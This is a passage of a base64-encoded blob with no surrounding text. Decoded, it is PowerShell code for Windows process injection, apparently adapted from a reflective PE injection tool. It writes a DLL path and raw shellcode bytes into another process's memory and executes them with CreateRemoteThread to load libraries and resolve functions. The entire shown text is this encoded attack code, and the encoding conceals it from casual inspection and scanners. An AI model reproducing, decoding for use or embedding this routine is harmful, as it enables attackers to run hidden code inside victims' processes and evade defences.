QkJCXRocm93ICJVbmFibGUgdG8gd3JpdGUgRExMIHBhdGggdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IjsNCgkJCX0NCgkJCWlmICgkRGxsUGF0aFNpemUgLW5lICROdW1CeXRlc1dyaXR0ZW4pDQoJCQl7DQoJCQkJJGNtZFJlcy5WYWx1ZSA9IDE4Ow0KCQkJCXRocm93ICJEaWRuJ3Qgd3JpdGUgdGhlIGV4cGVjdGVkIGFtb3VudCBvZiBieXRlcyB3aGVuIHdyaXRpbmcgYSBETEwgcGF0aCB0byBsb2FkIHRvIHRoZSByZW1vdGUgcHJvY2VzcyI7DQoJCQl9DQoJCQkkS2VybmVsMzJIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgia2VybmVsMzIuZGxsIik7DQoJCQkkTG9hZExpYnJhcnlBQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbDMySGFuZGxlLCAiTG9hZExpYnJhcnlBIik7DQoJCQlbSW50UHRyXSREbGxBZGRyZXNzID0gW0ludFB0cl06Olplcm87DQoJCQlpZiAoJFBFSW5mby5QRTY0Qml0IC1lcSAkdHJ1ZSkNCgkJCXsNCgkJCQkkTG9hZExpYnJhcnlBUmV0TWVtID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sICREbGxQYXRoU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSk7DQoJCQkJaWYgKCRMb2FkTGlicmFyeUFSZXRNZW0gLWVxIFtJbnRQdHJdOjpaZXJvKQ0KCQkJCXsNCgkJCQkJJGNtZFJlcy5WYWx1ZSA9IDE5Ow0KCQkJCQl0aHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHRoZSByZXR1cm4gdmFsdWUgb2YgTG9hZExpYnJhcnlBIjsNCgkJCQl9DQoJCQkJJExvYWRMaWJyYXJ5U0MxID0gQCgweDUzLCAweDQ4LCAweDg5LCAweGUzLCAweDQ4LCAweDgzLCAweGVjLCAweDIwLCAweDY2LCAweDgzLCAweGU0LCAweGMwLCAweDQ4LCAweGI5KTsNCgkJCQkkTG9hZExpYnJhcnlTQzIgPSBAKDB4NDgsIDB4YmEpOw0KCQkJCSRMb2FkTGlicmFyeVNDMyA9IEAoMHhmZiwgMHhkMiwgMHg0OCwgMHhiYSk7DQoJCQkJJExvYWRMaWJyYXJ5U0M0ID0gQCgweDQ4LCAweDg5LCAweDAyLCAweDQ4LCAweDg5LCAweGRjLCAweDViLCAweGMzKTsNCgkJCQkkU0NMZW5ndGggPSAkTG9hZExpYnJhcnlTQzEuTGVuZ3RoICsgJExvYWRMaWJyYXJ5U0MyLkxlbmd0aCArICRMb2FkTGlicmFyeVNDMy5MZW5ndGggKyAkTG9hZExpYnJhcnlTQzQuTGVuZ3RoICsgKCRQdHJTaXplICogMyk7DQoJCQkJJFNDUFNNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFNDTGVuZ3RoKTsNCgkJCQkkU0NQU01lbU9yaWdpbmFsID0gJFNDUFNNZW07DQoJCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJExvYWRMaWJyYXJ5U0MxIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtOw0KCQkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRMb2FkTGlicmFyeVNDMS5MZW5ndGgpOw0KCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRSSW1wb3J0RGxsUGF0aFB0ciwgJFNDUFNNZW0sICRmYWxzZSk7DQoJCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpOw0KCQkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRMb2FkTGlicmFyeVNDMiAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbTsNCgkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkTG9hZExpYnJhcnlTQzIuTGVuZ3RoKTsNCgkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTG9hZExpYnJhcnlBQWRkciwgJFNDUFNNZW0sICRmYWxzZSk7DQoJCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpOw0KCQkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRMb2FkTGlicmFyeVNDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbTsNCgkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkTG9hZExpYnJhcnlTQzMuTGVuZ3RoKTsNCgkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTG9hZExpYnJhcnlBUmV0TWVtLCAkU0NQU01lbSwgJGZhbHNlKTsNCgkJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSk7DQoJCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJExvYWRMaWJyYXJ5U0M0IC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtOw0KCQkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRMb2FkTGlicmFyeVNDNC5MZW5ndGgpOw0KCQkJCSRSU0NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOw0KCQkJCWlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pDQoJCQkJew0KCQkJCQkkY21kUmVzLlZhbHVlID0gMjA7DQoJCQkJCXRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBmb3Igc2hlbGxjb2RlIjsNCgkJCQl9DQoJCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsICRTQ1BTTWVtT3JpZ2luYWwsIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pOw0KCQkJCWlmICgoJFN1Y2Nlc3MgLWVxICRmYWxzZSkgLW9yIChbVUludDY0XSROdW1CeXRlc1dyaXR0ZW4gLW5lIFtVSW50NjRdJFNDTGVuZ3RoKSkNCgkJCQl7DQoJCQkJCSRjbWRSZXMuVmFsdWUgPSAyMTsNCgkJCQkJdGhyb3cgIlVuYWJsZSB0byB3cml0ZSBzaGVsbGNvZGUgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5LiI7DQoJCQkJfQ0KCQkJCSRSVGhyZWFkSGFuZGxlID0gQ3JlYXRlLVJlbW90ZVRocmVhZCAtUHJvY2Vzc0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtU3RhcnRBZGRyZXNzICRSU0NBZGRyIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnM7DQoJCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApOw0KCQkJCWlmICgkUmVzdWx0IC1uZSAwKQ0KCQkJCXsNCgkJCQkJJGNtZFJlcy5WYWx1ZSA9IDIyOw0KCQkJCQl0aHJvdyAiQ2FsbCB0byBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBHZXRQcm9jQWRkcmVzcyBmYWlsZWQuIjsNCgkJCQl9DQoJCQkJW0ludFB0cl0kUmV0dXJuVmFsTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKTsNCgkJCQkkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLlJlYWRQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJExvYWRMaWJyYXJ5QVJldE1lbSwgJFJldHVyblZhbE1lbSwgW1VJbnRQdHJdW1VJbnQ2NF0kUHRyU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKTsNCgkJCQlpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQ0KCQkJCXsNCgkJCQkJJGNtZFJlcyA9IC0yMzsNCgkJCQkJdGhyb3cgIkNhbGwgdG8gUmVhZFByb2Nlc3NNZW1vcnkgZmFpbGVkIjsNCgkJCQl9DQoJCQkJW0ludFB0cl0kRGxsQWRkcmVzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRSZXR1cm5WYWxNZW0sIFtUeXBlXVtJbnRQdHJdKTsNCgkJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRMb2FkTGlicmFyeUFSZXRNZW0sIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsOw0KCQkJCSRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsOw0KCQkJfQ0KCQkJZWxzZQ0KCQkJew0KCQkJCVtJbnRQdHJdJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJExvYWRMaWJyYXJ5QUFkZHIgLUFyZ3VtZW50UHRyICRSSW1wb3J0RGxsUGF0aFB0ciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zOw0KCQkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFJUaHJlYWRIYW5kbGUsIDIwMDAwKTsNCgkJCQlpZiAoJFJlc3VsdCAtbmUgMCkNCgkJCQl7DQoJCQkJCSRjbWRSZXMuVmFsdWUgPSAyNDsNCgkJCQkJdGhyb3cgIkNhbGwgdG8gQ3JlYXRlUmVtb3RlVGhyZWFkIHRvIGNhbGwgR2V0UHJvY0FkZHJlc3MgZmFpbGVkLiI7DQoJCQkJfQ0KCQkJCVtJbnQzMl0kRXhpdENvZGUgPSAwOw0KCQkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuR2V0RXhpdENvZGVUaHJlYWQuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCBbUmVmXSRFeGl0Q29kZSk7DQoJCQkJaWYgKCgkUmVzdWx0IC1lcSAwKSAtb3IgKCRFeGl0Q29kZSAtZXEgMCkpDQoJCQkJew0KCQkJCQkkY21kUmVzLlZhbHVlID0gMjU7DQoJCQkJCXRocm93ICJDYWxsIHRvIEdldEV4aXRDb2RlVGhyZWFkIGZhaWxlZCI7DQoJCQkJfQ0KCQkJCVtJbnRQdHJdJERsbEFkZHJlc3MgPSBbSW50UHRyXSRFeGl0Q29kZTsNCgkJCX0NCgkJCSRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJJbXBvcnREbGxQYXRoUHRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbDsNCgkJCXJldHVybiAkRGxsQWRkcmVzczsNCgkJfQ0KCQlGdW5jdGlvbiBHZXQtUmVtb3RlUHJvY0FkZHJlc3MNCgkJew0KCQkJUGFyYW0gKA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW0ludFB0cl0kUmVtb3RlUHJvY0hhbmRsZSwNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtJbnRQdHJdJFJlbW90ZURsbEhhbmRsZSwNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtJbnRQdHJdJEZ1bmN0aW9uTmFtZVB0ciwNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtCb29sXSRMb2FkQnlPcmRpbmFsDQoJCQkpDQoJCQkkUHRyU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSk7DQoJCQlbSW50UHRyXSRSRnVuY05hbWVQdHIgPSBbSW50UHRyXTo6WmVybzsNCgkJCWlmICgtbm90ICRMb2FkQnlPcmRpbmFsKQ0KCQkJew0KCQkJCSRGdW5jdGlvbk5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJEZ1bmN0aW9uTmFtZVB0cik7DQoJCQkJJEZ1bmN0aW9uTmFtZVNpemUgPSBbVUludFB0cl1bVUludDY0XShbVUludDY0XSRGdW5jdGlvbk5hbWUuTGVuZ3RoICsgMSk7DQoJCQkJJFJGdW5jTmFtZVB0ciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCAkRnVuY3Rpb25OYW1lU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSk7DQoJCQkJaWYgKCRSRnVuY05hbWVQdHIgLWVxIFtJbnRQdHJdOjpaZXJvKQ0KCQkJCXsNCgkJCQkJJGNtZFJlcy5WYWx1ZSA9IDI2Ow0KCQkJCQl0aHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MiOw0KCQkJCX0NCgkJCQlbVUludFB0cl0kTnVtQnl0ZXNXcml0dGVuID0gW1VJbnRQdHJdOjpaZXJvOw0KCQkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSRnVuY05hbWVQdHIsICRGdW5jdGlvbk5hbWVQdHIsICRGdW5jdGlvbk5hbWVTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pOw0KCQkJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQ0KCQkJCXsNCgkJCQkJJGNtZFJlcy5WYWx1ZSA9IDI3Ow0KCQkJCQl0aHJvdyAiVW5hYmxlIHRvIHdyaXRlIERMTCBwYXRoIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSI7DQoJCQkJfQ0KCQkJCWlmICgkRnVuY3Rpb25OYW1lU2l6ZSAtbmUgJE51bUJ5dGVzV3JpdHRlbikNCgkJCQl7DQoJCQkJCSRjbWRSZXMuVmFsdWUgPSAyODsNCgkJCQkJdGhyb3cgIkRpZG4ndCB3cml0ZSB0aGUgZXhwZWN0ZWQgYW1vdW50IG9mIGJ5dGVzIHdoZW4gd3JpdGluZyBhIERMTCBwYXRoIHRvIGxvYWQgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIjsNCgkJCQl9DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJFJGdW5jTmFtZVB0ciA9ICRGdW5jdGlvbk5hbWVQdHI7DQoJCQl9DQoJCQkkS2VybmVsMzJIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgia2VybmVsMzIuZGxsIik7DQoJCQkkR2V0UHJvY0FkZHJlc3NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJHZXRQcm9jQWRkcmVzcyIpOw0KCQkJJEdldFByb2NBZGRyZXNzUmV0TWVtID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50NjRdW1VJbnQ2NF0kUHRyU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSk7DQoJCQlpZiAoJEdldFByb2NBZGRyZXNzUmV0TWVtIC1lcSBbSW50UHRyXTo6WmVybykNCgkJCXsNCgkJCQkkY21kUmVzLlZhbHVlID0gMjk7DQoJCQkJdGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciB0aGUgcmV0dXJuIHZhbHVlIG9mIEdldFByb2NBZGRyZXNzIjsNCgkJCX0NCgkJCVtCeXRlW11dJEdldFByb2NBZGRyZXNzU0MgPSBAKCk7DQoJCQlpZiAoJFBFSW5mby5QRTY0Qml0IC1lcSAkdHJ1ZSkNCgkJCXsNCgkJCQkkR2V0UHJvY0FkZHJlc3NTQzEgPSBAKDB4NTMsIDB4NDgsIDB4ODksIDB4ZTMsIDB4NDgsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4NDgsIDB4YjkpOw0KCQkJCSRHZXRQcm9jQWRkcmVzc1NDMiA9IEAoMHg0OCwgMHhiYSk7DQoJCQkJJEdldFByb2NBZGRyZXNzU0MzID0gQCgweDQ4LCAweGI4KTsNCgkJCQkkR2V0UHJvY0FkZHJlc3NTQzQgPSBAKDB4ZmYsIDB4ZDAsIDB4NDgsIDB4YjkpOw0KCQkJCSRHZXRQcm9jQWRkcmVzc1NDNSA9IEAoMHg0OCwgMHg4OSwgMHgwMSwgMHg0OCwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMyk7DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJEdldFByb2NBZGRyZXNzU0MxID0gQCgweDUzLCAweDg5LCAweGUzLCAweDgzLCAweGU0LCAweGMwLCAweGI4KTsNCgkJCQkkR2V0UHJvY0FkZHJlc3NTQzIgPSBAKDB4YjkpOw0KCQkJCSRHZXRQcm9jQWRkcmVzc1NDMyA9IEAoMHg1MSwgMHg1MCwgMHhiOCk7DQoJCQkJJEdldFByb2NBZGRyZXNzU0M0ID0gQCgweGZmLCAweGQwLCAweGI5KTsNCgkJCQkkR2V0UHJvY0FkZHJlc3NTQzUgPSBAKDB4ODksIDB4MDEsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpOw0KCQkJfQ0KCQkJJFNDTGVuZ3RoID0gJEdldFByb2NBZGRyZXNzU0MxLkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDMi5MZW5ndGggKyAkR2V0UHJvY0FkZHJlc3NTQzMuTGVuZ3RoICsgJEdldFByb2NBZGRyZXNzU0M0Lkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDNS5MZW5ndGggKyAoJFB0clNpemUgKiA0KTsNCgkJCSRTQ1BTTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRTQ0xlbmd0aCk7DQoJCQkkU0NQU01lbU9yaWdpbmFsID0gJFNDUFNNZW07DQoJCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzEgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW07DQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzEuTGVuZ3RoKTsNCgkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRSZW1vdGVEbGxIYW5kbGUsICRTQ1BTTWVtLCAkZmFsc2UpOw0KCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpOw0KCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0MyIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtOw0KCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0MyLkxlbmd0aCk7DQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkUkZ1bmNOYW1lUHRyLCAkU0NQU01lbSwgJGZhbHNlKTsNCgkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKTsNCgkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRHZXRQcm9jQWRkcmVzc1NDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbTsNCgkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRHZXRQcm9jQWRkcmVzc1NDMy5MZW5ndGgpOw0KCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEdldFByb2NBZGRyZXNzQWRkciwgJFNDUFNNZW0sICRmYWxzZSk7DQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSk7DQoJCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzQgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW07DQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzQuTGVuZ3RoKTsNCgkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRHZXRQcm9jQWRkcmVzc1JldE1lbSwgJFNDUFNNZW0sICRmYWxzZSk7DQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSk7DQoJCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzUgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW07DQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzUuTGVuZ3RoKTsNCgkJCSRSU0NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOw0KCQkJaWYgKCRSU0NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykNCgkJCXsNCgkJCQkkY21kUmVzLlZhbHVlID0gMzA7DQoJCQkJdGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciBzaGVsbGNvZGUiOw0KCQkJfQ0KCQkJW1VJbnRQdHJdJE51bUJ5dGVzV3JpdHRlbiA9IFtVSW50UHRyXTo6WmVybzsNCgkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCAkU0NQU01lbU9yaWdpbmFsLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKTsNCgkJCWlmICgoJFN1Y2Nlc3MgLWVxICRmYWxzZSkgLW9yIChbVUludDY0XSROdW1CeXRlc1dyaXR0ZW4gLW5lIFtVSW50NjRdJFNDTGVuZ3RoKSkNCgkJCXsNCgkJCQkkY21kUmVzLlZhbHVlID0gMzE7DQoJCQkJdGhyb3cgIlVuYWJsZSB0byB3cml0ZSBzaGVsbGNvZGUgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5LiI7DQoJCQl9DQoJCQkkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkUlNDQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zOw0KCQkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5XYWl0Rm9yU2luZ2xlT2JqZWN0Lkludm9rZSgkUlRocmVhZEhhbmRsZSwgMjAwMDApOw0KCQkJaWYgKCRSZXN1bHQgLW5lIDApDQoJCQl7DQoJCQkJJGNtZFJlcy5WYWx1ZSA9IDMyOw0KCQkJCXRocm93ICJDYWxsIHRvIENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIEdldFByb2NBZGRyZXNzIGZhaWxlZC4iOw0KCQkJfQ0KCQkJW0ludFB0cl0kUmV0dXJuVmFsTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKTsNCgkJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuUmVhZFByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkR2V0UHJvY0FkZHJlc3NSZXRNZW0sICRSZXR1cm5WYWxNZW0sIFtVSW50UHRyXVtVSW50NjRdJFB0clNpemUsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbik7DQoJCQlpZiAoKCRSZXN1bHQgLWVxICRmYWxzZSkgLW9yICgkTnVtQnl0ZXNXcml0dGVuIC1lcSAwKSkNCgkJCXsNCgkJCQkkY21kUmVzLlZhbHVlID0gMzM7DQoJCQkJdGhyb3cgIkNhbGwgdG8gUmVhZFByb2Nlc3NNZW1vcnkgZmFpbGVkIjsNCgkJCX0NCgkJCVtJbnRQdHJdJFByb2NBZGRyZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFJldHVyblZhbE1lbSwgW1R5cGVdW0ludFB0cl0pOw0KCQkJJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxl